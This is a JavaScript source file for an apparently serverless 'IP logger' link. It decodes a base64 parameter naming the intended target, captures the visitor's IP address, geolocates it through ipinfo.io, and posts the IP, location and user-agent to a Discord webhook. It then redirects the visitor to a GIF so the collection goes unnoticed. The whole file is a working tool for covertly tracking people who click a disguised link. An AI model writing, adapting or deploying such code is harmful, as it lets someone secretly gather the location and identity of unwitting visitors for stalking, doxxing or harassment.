import fetch from "node-fetch";
import dotenv from "dotenv";
import express from "express";
import { Buffer } from "buffer";

dotenv.config();
const app = express();

export default async (req, res) => {
  console.log("Link visited");

  try {
    const base64String = req.query.u;

    const decodedData = Buffer.from(base64String, "base64").toString("utf-8");

    console.log("Base64 Decoded String:", decodedData);

    const ipAddress =
      req.headers["x-forwarded-for"] ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress;

    const fetchLocation = async () => {
      const response = await fetch(`https://ipinfo.io/${ipAddress}/json`);
      const data = await response.json();
      return data.city
        ? `${data.city}, ${data.region}, ${data.country}`
        : "Unknown";
    };

    const location = await fetchLocation();

    const userAgent = req.headers["user-agent"] || "Unknown";

    const openedBy = decodedData
      ? `Opened by: ${decodedData}`
      : "Opened by: Unknown";

    const discordWebhook = await fetch(process.env.DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: null,
        embeds: [
          {
            title: "New Visitor",
            description: openedBy,
            color: 16711680,
            fields: [
              {
                name: "Visitor's IP",
                value: ipAddress || "Unknown",
              },
              {
                name: "Estimated Location",
                value: location || "Unknown",
              },
              {
                name: "User-Agent",
                value: userAgent || "Unknown",
              },
            ],
            footer: {
              text: "github.com/crunny/info-webhook",
            },
            timestamp: new Date().toISOString(),
          },
        ],
        username: "Info Webhook",
        avatar_url:
          "https://i.pinimg.com/736x/c0/74/9b/c0749b7cc401421662ae901ec8f9f660.jpg",
        attachments: [],
      }),
    });

    // Redirect user to a website
    res.redirect("https://c.tenor.com/x8v1oNUOmg4AAAAd/tenor.gif");

    if (!discordWebhook.ok)
      throw new Error("Failed to send message to Discord webhook");

    console.log("Message sent to Discord webhook");

    return res.status(200).end();
  } catch (err) {
    console.error("Error sending message to Discord webhook:", err);
    return res.status(500).end();
  }
};
